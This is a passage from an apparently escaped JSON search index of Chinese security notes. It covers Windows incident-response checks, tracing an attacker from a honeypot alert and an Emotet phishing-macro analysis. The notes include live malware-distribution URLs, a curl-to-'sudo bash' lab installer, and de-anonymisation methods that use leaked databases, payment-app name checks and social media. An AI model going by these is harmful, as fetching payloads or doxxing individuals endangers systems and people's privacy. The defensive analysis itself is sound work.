\u6216\u5185\u5b58\u8d44\u6e90\u5360\u7528\u957f\u65f6\u95f4\u8fc7\u9ad8\u7684\u8fdb\u7a0b 3\u3001\u5c0f\u6280\u5de7\uff1a a\u3001\u67e5\u770b\u7aef\u53e3\u5bf9\u5e94\u7684 PID\uff1anetstat -ano | findstr \\\"port\\\" b\u3001\u67e5\u770b\u8fdb\u7a0b\u5bf9\u5e94\u7684 PID\uff1a\u4efb\u52a1\u7ba1\u7406\u5668 -- \u67e5\u770b -- \u9009\u62e9\u5217 -- PID \u6216\u8005 tasklist | findstr \\\"PID\\\" c\u3001\u67e5\u770b\u8fdb\u7a0b\u5bf9\u5e94\u7684\u7a0b\u5e8f\u4f4d\u7f6e\uff1a \u4efb\u52a1\u7ba1\u7406\u5668 -- \u9009\u62e9\u5bf9\u5e94\u8fdb\u7a0b -- \u53f3\u952e\u6253\u5f00\u6587\u4ef6\u4f4d\u7f6e \u8fd0\u884c\u8f93\u5165 wmic\uff0ccmd \u754c\u9762\u8f93\u5165 process d\u3001tasklist /svc \u8fdb\u7a0b -- PID -- \u670d\u52a1 e\u3001\u67e5\u770bWindows\u670d\u52a1\u6240\u5bf9\u5e94\u7684\u7aef\u53e3\uff1a %systemroot%/system32/drivers/etc/services\uff08\u4e00\u822c %systemroot% \u5c31\u662f C:\\Windows \u8def\u5f84\uff09","title":"\u8fdb\u7a0b\u67e5\u8be2"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_34","text":"1\u3001\u68c0\u67e5\u670d\u52a1\u5668\u662f\u5426\u6709\u5f02\u5e38\u7684\u542f\u52a8\u9879\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u767b\u5f55\u670d\u52a1\u5668\uff0c\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u6240\u6709\u7a0b\u5e8f\u3011>\u3010\u542f\u52a8\u3011\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6b64\u76ee\u5f55\u5728\u662f\u4e00\u4e2a\u7a7a\u76ee\u5f55\uff0c\u786e\u8ba4\u662f\u5426\u6709\u975e\u4e1a\u52a1\u7a0b\u5e8f\u5728\u8be5\u76ee\u5f55\u4e0b\u3002 b\u3001\u5355\u51fb\u5f00\u59cb\u83dc\u5355 >\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165 msconfig\uff0c\u67e5\u770b\u662f\u5426\u5b58\u5728\u547d\u540d\u5f02\u5e38\u7684\u542f\u52a8\u9879\u76ee\uff0c\u662f\u5219\u53d6\u6d88\u52fe\u9009\u547d\u540d\u5f02\u5e38\u7684\u542f\u52a8\u9879\u76ee\uff0c\u5e76\u5230\u547d\u4ee4\u4e2d\u663e\u793a\u7684\u8def\u5f84\u5220\u9664\u6587\u4ef6\u3002 c\u3001\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165 regedit\uff0c\u6253\u5f00\u6ce8\u518c\u8868\uff0c\u67e5\u770b\u5f00\u673a\u542f\u52a8\u9879\u662f\u5426\u6b63\u5e38\uff0c\u7279\u522b\u6ce8\u610f\u5982\u4e0b\u4e09\u4e2a\u6ce8\u518c\u8868\u9879\uff1a HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce","title":"\u68c0\u67e5\u542f\u52a8\u9879\u3001\u8ba1\u5212\u4efb\u52a1\u3001\u670d\u52a1"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#webshell_1","text":"\u4f7f\u7528D\u76fe\u8fdb\u884c\u5168\u76d8\u626b\u63cf\uff0c\u5bf9\u811a\u672c\u6587\u4ef6\u8fdb\u884c\u4eba\u5de5\u5224\u65ad\u3002","title":"Webshell"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_35","text":"\u672c\u7bc7\u5185\u5bb9\u4e3b\u8981\u4ee5\\\"2020HW\\\"\u884c\u52a8\u53d1\u751f\u7684\u771f\u5b9e\u653b\u51fb\u4e8b\u4ef6\u4e3a\u4e3b\uff0c\u76ee\u7684\u662f\u7528\u5b9e\u6218\u6848\u5217\u7ed9\u5927\u5bb6\u6700\u76f4\u89c2\u7684\u611f\u53d7\uff0c\u90e8\u5206\u5185\u5bb9\u5df2\u8131\u654f\u3002","title":"\u5b9e\u6218\u7bc7"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#1web","text":"\uff081\uff099.13\u65e5\uff0c18:10:43\u5206\u871c\u7f50\u8bbe\u5907\u544a\u8b66\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u5bf9\u81ea\u5b9a\u4e49\u871c\u7f50\u754c\u9762\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u5728\u7814\u5224\u65f6\u53d1\u73b0\u8be5\u653b\u51fb\u8005IP\u5730\u5740\u4e3a\u603b\u90e8\u7edf\u4e00\u4e0b\u53d1\u7684\u9ad8\u5371\u9884\u8b66IP\uff0c\u968f\u7acb\u5373\u5bf9\u5176\u5c55\u5f00\u653b\u51fb\u6eaf\u6e90\u5de5\u4f5c\u3002 \u6211\u4eec\u83b7\u53d6\u5230IP\u540e\uff0c\u9996\u5148\u5bf9\u5176\u8fdb\u884c\u5a01\u80c1\u60c5\u62a5\u6536\u96c6\uff0c\u63a8\u8350\u4f7f\u7528\u5fae\u6b65\u5728\u7ebf\u5a01\u80c1\u60c5\u62a5\u793e\u533a\u3002\u5982\u56fe\uff1a \uff082\uff09\u901a\u8fc7ping\u8be5\u57df\u540d\u6765\u83b7\u53d6\u5176\u4f7f\u7528\u7684\u771f\u5b9e\u5730\u5740\uff0c\u5f97\u5230\u573061.188.254.133\uff0c\u901a\u8fc7\u8be5\u5730\u5740\u53cd\u67e5\u57df\u540d\u5f97\u5230xxooxxoo.xyz\uff0c\u518d\u67e5\u8be2\u8be5\u57df\u540d\u7684whois\u4fe1\u606f\uff0c\u6211\u4eec\u5f97\u5230\u4e86\u653b\u51fb\u8005\u7684\u521d\u6b65\u4fe1\u606f\u3002 \u5728\u5b9e\u6218\u8fc7\u7a0b\u4e2d\uff0c\u5f80\u5f80\u6211\u4eec\u53cd\u67e5IP\u5730\u5740\u83b7\u53d6\u5230\u7684\u57df\u540d\u662f\u83b7\u53d6\u4e0d\u5230\u6709\u6548\u7684\u5229\u7528\u4fe1\u606f\u7684\uff0c\u6b64\u65f6\u6211\u4eec\u9700\u8981\u66f4\u52a0\u8010\u5fc3\uff0c\u67e5\u8be2\u5176\u5386\u53f2\u6ce8\u518c\u57df\u540d\uff0c\u901a\u8fc7\u4e0d\u65ad\u7684IP\u53cd\u67e5\uff0c\u57df\u540d\u53cd\u67e5\u6765\u83b7\u53d6\u66f4\u591a\u4fe1\u606f\uff0c\u6e17\u900f\u7684\u672c\u8d28\u662f\u4fe1\u606f\u6536\u96c6\uff0c\u6eaf\u6e90\u7684\u672c\u8eab\u4e5f\u662f\u4fe1\u606f\u6536\u96c6\u7684\u4e00\u79cd\u4f53\u73b0\u3002 \uff083\uff09\u901a\u8fc7\u524d\u4e24\u6b65\u7684\u5206\u6790\uff0c\u6211\u4eec\u5f97\u5230\u4e86\u653b\u51fb\u8005\u7684\u624b\u673a\u53f7\u4e0e\u59d3\u540d\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u793e\u4ea4\u5e73\u53f0\u53caAPP\u6765\u9a8c\u8bc1\u653b\u51fb\u8005\u7684\u771f\u5b9e\u6027\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u793e\u5de5\u5e93\u6765\u83b7\u53d6\u653b\u51fb\u8005\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u793e\u5de5\u5e93\u6e90\u81eaTelegram\uff08\u7531\u4e8e\u9700\u8981\u7ffb\u5899\u8fd9\u91cc\u4e0d\u518d\u63d0\u4f9b\u622a\u56fe\uff0c\u5927\u5bb6\u81ea\u884c\u67e5\u627e\uff09\u3002 1.\u652f\u4ed8\u5b9d\u901a\u8fc7\u8f6c\u8d26\u529f\u80fd\u53ef\u4ee5\u9a8c\u8bc1\u5176\u59d3\u540d\u771f\u5b9e\u6027\u3002 \u901a\u8fc7QQ\u53f7\uff0c\u8fdb\u5165QQ\u7a7a\u95f4\u83b7\u53d6\u5230\u5927\u91cf\u4e2a\u4eba\u4fe1\u606f\uff08\u670b\u53cb\u5708\uff0cQQ\u7a7a\u95f4\u8fd9\u79cd\u793e\u4ea4\u5708\u5b50\u5927\u5bb6\u5c3d\u91cf\u8fd8\u662f\u8bbe\u7f6e\u4e3a\u4e0d\u5141\u8bb8\u964c\u751f\u4eba\u8bbf\u95ee\uff09 \u6b64\u65f6\u53ef\u4ee5\u5224\u65ad\u653b\u51fb\u8005\u66fe\u5c31\u804c\u4e8e\u817e\u8baf\u3002\u540c\u65f6\u901a\u8fc7QQ\u7a7a\u95f4\u6211\u4eec\u8fd8\u53d1\u73b0\u653b\u51fb\u8005\u66fe\u5f00\u53d1\u8fc7\u5fae\u4fe1\u516c\u4f17\u53f7\uff0c\u901a\u8fc7\u641c\u7d22\u5f15\u64ce\u641c\u7d22\u83b7\u53d6\u5230\u7684scjtqs\u5173\u952e\u8bcd\uff0c\u6211\u4eec\u83b7\u53d6\u5230\u4e86\u653b\u51fb\u8005\u7684github\u4fe1\u606f\uff0c\u4e00\u4e9b\u5f00\u53d1\u9879\u76ee\u7684\u4fe1\u606f\uff0c\u53ef\u4ee5\u8bc1\u660e\u653b\u51fb\u8005\u662fIT\u884c\u4e1a\u4ece\u4e1a\u8005\u3002","title":"1.web\u653b\u51fb\u6eaf\u6e90\u7bc7"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#2","text":"\u9493\u9c7c\u90ae\u4ef6\u653b\u51fb\u591a\u4e3a\u4e24\u79cd\uff0c\u4e00\u662f\u5e26\u6709\u9644\u4ef6\u7684word\u5b8f\u75c5\u6bd2\uff0c\u4e8c\u662f\u5f15\u5bfc\u53d7\u5bb3\u8005\u8fdb\u5165\u9493\u9c7c\u7f51\u7ad9\u6765\u83b7\u53d6\u53d7\u5bb3\u8005\u7684\u654f\u611f\u4fe1\u606f\u3002\u8bc6\u522b\u9493\u9c7c\u90ae\u4ef6\u9996\u5148\u5173\u6ce8\u53d1\u4ef6\u4eba\u7684\u5730\u5740\u4fe1\u606f\uff0c\u4ee5\u53ca\u653b\u51fb\u8005\u53d1\u8fc7\u6765\u7684\u6076\u610f\u94fe\u63a5\u5730\u5740\uff08\u5c06\u9f20\u6807\u5149\u6807\u79fb\u52a8\u81f3\u6076\u610f\u94fe\u63a5\u5730\u5740\u5728\u6d4f\u89c8\u5668\u5de6\u4e0b\u89d2\u53ef\u4ee5\u770b\u5230\u76f8\u5173\u5730\u5740\uff09\u3002\u540c\u65f6\u5728\u5927\u5bb6\u65e5\u5e38\u5de5\u4f5c\u4e2d\u8981\u63d0\u9ad8\u81ea\u5df1\u7684\u5b89\u5168\u610f\u8bc6\uff0c\u4e0d\u8981\u4f7f\u7528\u4ee5\u81ea\u5df1\u751f\u65e5\u547d\u540d\u7684\u5bc6\u7801\u6216\u8005\u7b80\u5355\u7684\u5bc6\u7801\u7ec4\u5408\uff0c\u4e0d\u8981\u518d\u4e92\u8054\u7f51\u4e2d\u7ecf\u5e38\u4f7f\u7528\u4e2a\u4eba\u4fe1\u606f\u6765\u8fdb\u884c\u6ce8\u518c\uff0c\u5f80\u5f80\u653b\u51fb\u8005\u518d\u83b7\u53d6\u5230\u5185\u90e8\u4eba\u5458\u90ae\u7bb1\u4e4b\u540e\u8fdb\u884c\u7684\u653b\u51fb\u4f1a\u4f7f\u5185\u90e8\u5458\u5de5\u5927\u9762\u79ef\u4e2d\u62db\u3002 \u4e00\u3001\u4e8b\u4ef6\u63cf\u8ff0\uff1a 2020\u5e7409\u670817\u65e5 17:11:00\u6211\u65b9\u62ff\u5230\u9493\u9c7c\u90ae\u4ef6\u6837\u672c\uff0c\u968f\u7acb\u5373\u5bf9\u5176\u5c55\u5f00\u5206\u6790\u5de5\u4f5c\u3002\u901a\u8fc7\u4e91\u6c99\u7bb1\u5bf9\u6837\u672c\u8fdb\u884c\u5206\u6790\uff0c\u53d1\u73b0\u5176\u4e3aword\u5b8f\u75c5\u6bd2\u3002 \u5c06\u6587\u4ef6\u4e0a\u4f20\u81f3\u4e91\u6c99\u7bb1\uff0c\u53ef\u53d1\u73b0\u8be5\u6587\u4ef6\u4e3a\u6076\u610f\u6587\u4ef6\u3002 \u5206\u6790\u603b\u7ed3\u8be5\u6587\u4ef6\u6267\u884c\u6d41\u7a0b\u5982\u4e0b\uff1a\u8fd0\u884c\u6587\u4ef6\u540e\u4f1a\u901a\u8fc7powershell\u6267\u884c\u6076\u610f\u4ee3\u7801\uff0c\u4e0b\u8f7d\u4e86\u540d\u4e3aK2ngq9rh.exe\u7684\u6076\u610f\u7a0b\u5e8f\uff0c\u8be5\u6076\u610f\u7a0b\u5e8f\u8fd0\u884c\u4f1a\u6267\u884c\u591a\u9879\u6076\u610f\u884c\u4e3a\u5e76\u5c06\u81ea\u8eab\u5220\u9664\u3002 \u6253\u5f00\u6587\u6863\u524d\u5148\u7981\u7528\u5b8f\uff0c\u9632\u6b62word\u5b8f\u4ee3\u7801\u6267\u884c\u5bf9\u673a\u5668\u8fdb\u884c\u9ad8\u5371\u64cd\u4f5c\uff0c\u5bf9\u5b8f\u4ee3\u7801\u8fdb\u884c\u5206\u6790\u3002 \u5206\u4e3aOd7aj7ii3yu\u548cK946e0s3qiq0\u4e24\u90e8\u5206\u5b8f\u4ee3\u7801\u3002 Od7aj7ii3yu \u51fd\u6570\u4e3a\u4e00\u4e2a\u79c1\u6709\u65b9\u6cd5\u5728\u6587\u6863\u6253\u5f00\u65f6\u521b\u5efa\u4e866\u4e2a\u5b57\u7b26\u4e32\u6570\u7ec4\u5bf9\u8c61\uff0c\u4e3a\u540e\u7eed\u64cd\u4f5c\u505a\u51c6\u5907\u3002 K946e0s3qiq0\u4e3a\u6076\u610f\u5b8f\u4ee3\u7801\u7684\u4e3b\u4f53\u7a0b\u5e8f\uff0c\u4ee3\u7801\u4e2d\u4f7f\u7528\u5b57\u7b26\u4e32\u62fc\u63a5\u4f5c\u4e3a\u5b57\u5178\uff0c\u4f7f\u7528mid\u3001trim\u3001split\u51fd\u6570\u504f\u79fb\u5bf9\u65e0\u5e8f\u5b57\u7b26\u4e32\u8fdb\u884c\u53d6\u503c\u3002 \u5bf9\u5176\u4e2d\u4e00\u4e2a\u90e8\u5206\u9a8c\u8bc1\u5982\u4e0b\uff1a \u7ee7\u7eed\u8ffd\u8e2a\u4ee3\u7801,\u53d1\u73b0\u516c\u4ee3\u7801\u4f1a\u8c03\u7528wmi(winmgmts),\u4f7f\u7528win32_process\u63a5\u53e3\u83b7\u53d6\u8ba1\u7b97\u673a\u7684\u7cfb\u7edf\u4fe1\u606f\u3002 \u7ee7\u7eed\u8ddf\u8e2a\u4ee3\u7801\u53d1\u73b0\u4e00\u4e2a\u6bd4\u8f83\u6709\u610f\u601d\u7684\u4e8b\u60c5\uff0c\u5728\u89e3\u5bc6\u8fc7\u7a0b\u4e2d\u4f1a\u51fa\u73b0pizdec \u5b57\u6837\u7684\u5b57\u7b26\u4e32\uff0c\u67e5\u8be2\u540e\u662f\u4fc4\u7f57\u65af\u8bed\uff0c\u6000\u7591\u8be5\u9493\u9c7c\u90ae\u4ef6\u4e0e\u4fc4\u7f57\u65af\u6709\u5173\u3002 \u7ee7\u7eed\u5206\u6790\uff0c\u53ef\u4ee5\u770b\u5230\u5728\u5b57\u7b26\u4e32\u89e3\u5bc6\u540e\u4f1a\u4f7f\u7528powershell -encode \u6267\u884c\u52a0\u5bc6\u540e\u7684\u4ee3\u7801\u3002 \u8be5\u52a0\u5bc6\u540e\u7684\u4ee3\u7801\u67092\u90e8\u5206\u6784\u6210\uff1a \u660e\u6587\u4f7f\u7528\".\"\u3001\"*\"\u3001\"/\"\u3001\" \"\u7b49\u505a\u6df7\u6dc6 \u6df7\u6dc6\u540e\u4f7f\u7528base64\u52a0\u5bc6 \u9006\u5411\u8be5\u8fc7\u7a0b\u8fd8\u539f\u660e\u6587 \u5206\u6790\u5b8f\u4ee3\u7801\u91ca\u653e\u7684exe\u6587\u4ef6\uff0c\u5728\u51fd\u6570\u4e2d\u53d1\u73b0\u4e86\u4f5c\u8005\u81ea\u5b9a\u4e49\u7684\u51fd\u6570\u540d\u79f0\u4e3alhxXfY9mIrDZ\uff0c\u7ed3\u5408\u5b8f\u4ee3\u7801\u4e2d\u7684pizdec\u3002\u8c37\u6b4c\u641c\u7d22\u540e\u53d1\u73b02020\u5e749\u670818\u53f7\u7684\u4e00\u4e2a\u6c99\u7bb1\u62a5\u544a\u3002 \u62a5\u544a\u5982\u4e0b \u6728\u9a6c\u903b\u8f91\u5206\u4e3a\u52a0\u8f7d\u5668\u548c\u6728\u9a6c\u6838\u5fc3\uff0c\u5728\u52a0\u8f7d\u5668\u8fd0\u884c\u65f6\uff0c\u4e5f\u5c31\u662fqct8u1hKuXXwoP.exe\u4f1a\u5148\u83b7\u53d6\u7cfb\u7edf\u7684\u57fa\u672c\u4fe1\u606f\u3001\u662f\u5426\u4e3a\u8c03\u8bd5\u73af\u5883\u7b49\u3002 \u5224\u65ad\u662f\u5426\u5728debug\u73af\u5883\u4e0b \u5982\u679c\u662f\u8c03\u8bd5\u73af\u5883\u5c31\u4f1asleep\uff0c\u4e0d\u6267\u884c\u540e\u7eed\u52a8\u4f5c\u3002 \u83b7\u53d6\u7cfb\u7edf\u7684cpu \u548c oem\u4fe1\u606f \u6839\u636e\u62a5\u544a\u5185\u5bb9\u53d1\u73b0\u5982\u679c\u52a0\u8f7d\u5668\u8fd0\u884c\u6b63\u5e38\u4f1a\u4e0b\u8f7d\u6728\u9a6c\u6838\u5fc3\u3002 \u62fc\u63a5\u4e0b\u8f7d\u5730\u5740\uff0c\u4e0b\u8f7d\u6728\u9a6c\u5206\u6790\u3002\u5728 ida\u4e2d\u5206\u6790\u53d1\u73b0\u6728\u9a6c\u4f5c\u8005\u6ca1\u6709\u5220\u53bb\u672c\u673a\u7684\u8c03\u8bd5\u8def\u5f84\u3002 \u6839\u636e\u6b64\u8def\u5f84\u4e3a\u5173\u952e\u5b57\u641c\u7d22\u53ef\u4ee5\u786e\u5b9a\u8be5\u9493\u9c7c\u90ae\u4ef6\u7684\u7ec4\u7ec7\u4e3a Emotet Emotet\u6076\u610f\u8f6f\u4ef6\u7684\u7b2c\u4e00\u4e2a\u7248\u672c\u65e9\u57282014\u5e74\u5c31\u88ab\u5e7f\u6cdb\u53d1\u73b0\uff0c\u5176\u76ee\u7684\u662f\u901a\u8fc7\u62e6\u622a\u4e92\u8054\u7f51\u6d41\u91cf\u6765\u7a83\u53d6\u94f6\u884c\u51ed\u8bc1\u3002\u9996\u6b21\u5728\u91ce\u5916\u53d1\u73b0Emotet\u65f6\uff0c\u8be5\u6076\u610f\u8f6f\u4ef6\u4ec5\u4f7f\u7528\u5176\u672c\u673a\u4fe1\u606f\u7a83\u53d6\u5de5\u5177\u96c6\uff0c\u4e3b\u8981\u9488\u5bf9\u5fb7\u56fd\u548c\u5965\u5730\u5229\u7684\u94f6\u884c\u3002Emotet\u80cc\u540e\u7684\u8fd0\u8425\u56e2\u961f\u662fMealybug\u3002\u8be5\u56e2\u961f \u662f\u4e00\u4e2a\u7f51\u7edc\u72af\u7f6a\u7ec4\u7ec7\uff0c\u81ea2014\u5e74\u4ee5\u6765\u4e00\u76f4\u4fdd\u6301\u6d3b\u8dc3\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5176\u4f7f\u7528\u7684\u81ea\u5b9a\u4e49\u6076\u610f\u8f6f\u4ef6Trojan.Emotet\u6765\u8bc6\u522b\u5b83\u3002\u8fd1\u51e0\u5e74\u6765\uff0cMealybug\u4f3c\u4e4e\u5df2\u7ecf\u6539\u53d8\u4e86\u5176\u5546\u4e1a\u6a21\u5f0f\uff0c\u4ece\u9488\u5bf9\u6b27\u6d32\u7684\u94f6\u884c\u5ba2\u6237\u8f6c\u53d8\u4e3a\u4e86\u4f7f\u7528\u5176\u57fa\u7840\u8bbe\u65bd\u4e3a\u5168\u7403\u5176\u4ed6\u5a01\u80c1\u884c\u4e3a\u8005\u63d0\u4f9b\u6076\u610f\u8f6f\u4ef6\u5305\u88c5\u548c\u4ea4\u4ed8\u670d\u52a1\u3002\u6b64\u6b21\u9493\u9c7c\u90ae\u4ef6\u653b\u51fb\uff0c\u662f\u9488\u5bf9\u4e8e\u653f\u5e9c\u4f01\u4e1a\u7684\u4e00\u6b21APT\u653b\u51fb\u3002 \u5206\u6790\u6587\u4ef6\u6267\u884c\u5185\u5bb9\uff0c\u53ef\u4ee5\u53d1\u73b0\u8be5\u6076\u610f\u6587\u4ef6\u4f1a\u6267\u884c\u591a\u79cd\u6076\u610f\u884c\u4e3a\uff0c\u5305\u62ec\u4ee3\u7801\u6df7\u6dc6\u3001\u91ca\u653e\u6076\u610f\u6587\u4ef6\u3001\u521b\u5efa\u53ef\u4ee5\u8fdb\u7a0b\u7b49\uff1a \u6587\u4ef6\u6267\u884c\u8fc7\u7a0b\u4e2d\u53ef\u89c2\u5bdf\u5230\u5176\u5b9e\u901a\u8fc7powershell\u8fdb\u884c\u6570\u636e\u7684\u4f20\u8f93\u5de5\u4f5c\u3002 \u901a\u8fc7\u5bf9\u6587\u4ef6\u6267\u884c\u4e2d\u7684powershell\u4ee3\u7801\u8fdb\u884c\u89e3\u7801\u5206\u6790\uff0c\u5f97\u5230\u6e90\u4ee3\u7801\u3002 \u89e3\u7801\u5f97\u5230 \u5bf9\u4ee3\u7801\u8fdb\u884c\u5206\u6790\u5f97\u77e5\u4ee3\u7801\u5185\u5bb9\u4e3a\u8bf7\u6c42\u4ee5\u4e0bURL http://theccwork.com/mail.theccwork.com/IJp/ \\ https://www.retirementprofessional.com/wp-admin/tjQ/ \\ https://writingfromling.live/wp-admin/GL/ \\ http://shahqutubuddin.org/ix/ \\ https://jumpstart.store/wp-admin/q/ \\ https://aidenshirt.com/wp-admin/e6f/ \\ https://edenrug.store/wp-admin/H/ \u5bf9\u4ee5\u4e0aURL\u8fdb\u884c\u6eaf\u6e90\u5206\u6790\u53d1\u73b0\u7ad9\u70b9\u5747\u4e3awordpress\u6a21\u677f\uff0cwordpress\u4e3a\u6700\u65b0\u7248\u672c\u65e0\u6cd5\u8fdb\u884c\u6f0f\u6d1e\u5229\u7528\u3002\u90e8\u5206\u4fe1\u606f\u5982\u4e0b\uff1a \u8bbf\u95ee\u8be5\u57df\u540d\u4f1a\u63d0\u793a\u6b64\u7f51\u7ad9\u4e3a\u9493\u9c7c\u7f51\u7ad9\u3002 \u70b9\u51fb\u94fe\u63a5\u4e0b\u8f7d\u5176\u4e2d\u75c5\u6bd2\u6587\u4ef6\u5e76\u8fdb\u884c\u5a01\u80c1\u60c5\u62a5\u5206\u6790\u3002 \u5bf9\u5176\u8bf7\u6c42\u7684IP\u5730\u5740\u8fdb\u884c\u60c5\u62a5\u6536\u96c6\u3002 \u53d1\u73b0\u5176\u4e3aEmotet\u94f6\u884c\u6728\u9a6c\u3002 2.\u672c\u5730\u6267\u884c\u6b64\u75c5\u6bd2\u6728\u9a6c\u901a\u8fc7\u5206\u6790\u6d41\u91cf\u53d1\u73b0\u5176\u6307\u5411\u4e24\u4e2a\u57df\u540d\u3002 \u5bf9\u6d41\u91cf\u4e2d\u7684\u57df\u540d\u5730\u5740\u8fdb\u884c\u6eaf\u6e90\u5206\u6790 \u5176IP\u5730\u5740\u4e3aEmotet\u94f6\u884c\u6728\u9a6c\u5730\u5740\u3002 3.\u901a\u8fc7\u5206\u6790\u8be5\u75c5\u6bd2\u6728\u9a6c\u6587\u4ef6\uff0c\u53d1\u73b0\u5176Host\u6307\u5411\u56db\u4e2aIP\u5730\u5740\u5176\u4e2d\u5305\u542bEmotet\u94f6\u884c\u6728\u9a6c\u5730\u5740\u3002 \u901a\u8fc7\u767e\u5ea6\u8bcd\u6761\u53ef\u5f97\u77e5\uff0cEMOTET\u94f6\u884c\u6728\u9a6c\u5176\u4e3b\u8981\u901a\u8fc7\u5783\u573e\u90ae\u4ef6\u7684\u65b9\u5f0f\u8fdb\u884c\u4f20\u64ad\u3002 \u7ed3\u8bba\uff1a \u6839\u636e\u4ee5\u4e0a\u7ebf\u7d22\u63a8\u65ad\u5206\u6790\uff0c\u6b64\u4e8b\u4ef6\u4e3a\u5883\u5916\u9ed1\u4ea7\u56e2\u4f19\u4f20\u64adEmotet\u94f6\u884c\u6728\u9a6c\u7684\u9493\u9c7c\u90ae\u4ef6\u653b\u51fb\uff0c\u5c1d\u8bd5\u5bf9\u653b\u51fb\u8005\u8fdb\u884c\u6eaf\u6e90\u53cd\u5236\u53d1\u73b0\u5176\u76f8\u5173\u7ad9\u70b9\u4e3a\u6d6e\u52a8\u53d8\u5316\u7ad9\u70b9\u3002\u672a\u80fd\u6709\u8fdb\u4e00\u6b65\u53d1\u73b0\u3002","title":"2.\u9493\u9c7c\u90ae\u4ef6\u5206\u6790\u7bc7"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/","text":"\u6e17\u900f\u6d4b\u8bd5\u4e0e\u8d4f\u91d1\u730e\u4eba \u8fdb\u9636\u662f\u4e2a\u5927\u96be\u9898\uff0c\u53ef\u80fd\u5165\u95e8\u4e5f\u662f\u4e2a\u96be\u9898\u3002\u826f\u9a79\u5f53\u914d\u826f\u978d\uff0c\u8d44\u6e90\u63a8\u8350\u3002 https://www.oreilly.com/ - --- sec875 \u53c2\u8003\u6750\u6599\uff1adefcon\u7ea2\u961f\u6751 https://bootcamp.h4cker.org/#next \u73af\u5883\u90e8\u7f72 websploit \u5b9e\u9a8c\u5ba4\u90e8\u7f72 https://websploit.org/ \u573a\u666f\u5206\u5e03\u56fe \u57fa\u4e8ekali\u7684docker\u90e8\u7f72 curl -sSL https://websploit.org/install.sh | sudo bash service docker start sudo docker ps \u9776\u673a\u5347\u7ea7 wget https://websploit.org/update.sh sudo bash update.sh \u57fa\u4e8eOVA\u7684\u90e8\u7f72\u65b9\u5f0f \u6211\u5df2\u7ecf\u57fa\u4e8eVMware\uff0c\u4ee5\u53ca\u589e\u52a0300G\u5bb9\u6613\uff0c\u548cubuntu\u81ea\u5df1\u62c9\u955c\u50cf\u5747\u4ee5\u5931\u8d25\u3002\u6211\u4e8e\u4f5c\u8005\u8ba4\u77e5\u4fdd\u6301\u4e00\u81f4\uff0c \u57fa\u4e8eVirtualBox\u7684\u90e8\u7f72\uff0c\u6ca1\u90a3\u4e48\u591a\u9519\u8bef\u3002 \u57fa\u4e8eOVA\u7684\u9776\u673a\uff0c\u4ec5\u4ec5\u53ea\u6709kali\uff0cinstall\u811a\u672c\u4e8eroot\u5bb6\u76ee\u5f55\u4e2d\u3002 https://websploit.org/download.html \u57fa\u4e8e\u6e17\u900f\u7684Raven\u4e0eVTC SEC\u9776\u673a https://drive.google.com/drive/folders/1eKADGFjdnsIsbajxSho6MAZZfqHAMwCp wget https://websploit.org/update.sh sudo bash update.sh","title":"\u6f0f\u6d1e\u6d4b\u8bd5"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E7%9B%AE%E5%BD%95/","text":"","title":"\u76ee\u5f55"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F/","text":"","title":"\u8bb0\u4e00\u6b21\u8fd1\u6e90\u6e17\u900f"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/","text":"\u524d\u8a00 \u00b6 \u4e3b\u8981\u9488\u5bf9SRC\u548c\u4f17\u6d4b\uff0c\u63a2\u8ba8\u81ea\u5df1\u7684\u65b9\u6cd5 \u600e\u4e48\u5206\u6790\uff0c\u600e\u4e48\u53bb\u7ed5\uff0c\u600e\u4e48\u53bb\u83b7\u53d6\u8bc1\u636e\uff0c\u7b49\u7b49 \u4e00\u3001\u62e6\u622a\u6846\u67b6\u4e0b\u6ce8\u5165\u7684\u8fc7\u7a0b\u62c6\u89e3 \u00b6 \u8d8a\u6765\u8d8a\u591a\u7684web\u7cfb\u7edf\uff0c\u968f\u7740\u8fd0\u7ef4\u65b9\u5b89\u5168\u610f\u8bc6\u7684\u63d0\u9ad8\uff0c\u7f51\u7edc\u8bbe\u5907\u7684\u6295\u5165\uff0c \u4ee5\u53ca\u5b89\u5168\u7f16\u7801\u89c4\u8303\u7684\u4ecb\u5165\uff0c\u6f0f\u6d1e\u7684\u53d1\u73b0\u4ece\u8fc7\u53bb\u7684\u7b80\u5355\u7c97\u66b4\uff0c\u5230\u73b0\u5728\u4e3e\u6b65 